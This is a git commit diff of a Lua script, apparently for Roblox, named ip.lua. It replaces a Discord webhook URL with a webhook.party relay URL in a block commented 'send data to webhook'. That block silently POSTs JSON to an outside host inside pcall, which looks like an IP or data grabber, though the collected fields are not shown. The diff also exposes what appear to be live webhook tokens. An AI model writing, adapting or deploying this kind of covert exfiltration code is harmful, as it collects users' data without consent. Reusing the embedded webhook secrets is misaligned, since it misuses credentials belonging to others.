25a829fd60bdd3c8a508558c2fc0d20d5fab1d2c
xielbers <88589081+xielbers@users.noreply.github.com>
2025-07-17 16:07:31 -0300

    Actualizar ip.lua

--- copy/ip.lua
+++ copy/ip.lua
@@ -24,7 +24,7 @@ end
 -- Enviar datos a Webhook
 pcall(function()
     (request or http_request or http and http.request)({
-        Url = "https://discord.com/api/webhooks/1395480773854888087/ZMI-vhms8myQz60yYD5wmamVxwKIpIAbiUJiwuuBciCyCbDIxGmaG2Yho_sbKaIasb0x",
+        Url = "https://l.webhook.party/hook/UhmC9lTLZKI6YMQfc9LwrwLPFzL%2BGxFO%2BstLQOE3slw9Bev78Zkfkc0IOdkr6%2Fvo45MpGmza1zthpwRkkP972KrY1Zdpp6kiK5LzyMr09xxU8%2FdybOnABAdHQG2tZZGd2Rcu9uY7DLe3YChbg7Silc9K9sYiRACjKoWOP1ntopw7zpCvqeGUaGZs5Zmiy7A%2BmKiYOe2iHdy4mH2Udl0%2FI%2FMB20D9U7pKmnbTQcKATLXml9l1oVTDeC9O3BRo%2FLrj0UbFr6BiFDgAdmuHAifBuGhQMBmY56JA%2BG2Aot8qMhpPnqVOn8Os8YKZ4N%2BRcFG7agnQWPVjwLgWJ4G2MQ3AZywHy47Kz4ONmhkx150FbG4XZdGZxcCaZsDAz4xm%2FQG8XRi4GWRkPKw%3D/ViaTuzjhjElC6x2r",
         Method = "POST",
         Body = httpService:JSONEncode({
             embeds = {
